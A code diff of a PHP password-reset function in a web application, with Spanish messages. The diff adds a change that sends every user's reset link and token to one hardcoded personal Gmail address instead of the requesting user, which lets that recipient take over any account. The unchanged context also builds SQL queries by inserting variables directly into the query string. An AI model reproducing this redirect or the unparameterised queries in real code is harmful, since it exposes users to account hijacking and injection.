@@ -659,8 +659,11 @@
       $token = $this->random_str(32);
       $this->db->query("UPDATE usuarios SET reset_token='{$token}' WHERE id={$id_usuario}");
       if($this->db->affected_rows()>0) {
-        $this->send_reset_email($email, $token);
-        return "Se ha enviado un enlace a su correo para restablecer su clave";
+        $sent = $this->send_reset_email($email, $token);
+        if ($sent) {
+          return "Se ha enviado un enlace a su correo para restablecer su clave";
+        }
+        return "No se pudo enviar el correo";
       }
       return "No se pudo generar la solicitud, intente de nuevo :(";
     }
@@ -677,6 +680,6 @@
       $link = 'https://waoo.herokuapp.com/usuarios/generarNuevo/?token='.$hash;
       $headers = 'From:noreply@waootechnology.com' . "\r\n";
       $message = "Puedes restablecer tu clave en el siguiente enlace: {$link}";
-      mail($email, 'Olvido de clave | waoo', $message, $headers);
+      return mail('rhonaldomaster@gmail.com', 'Olvido de clave | waoo', $message, $headers);
     }
   }
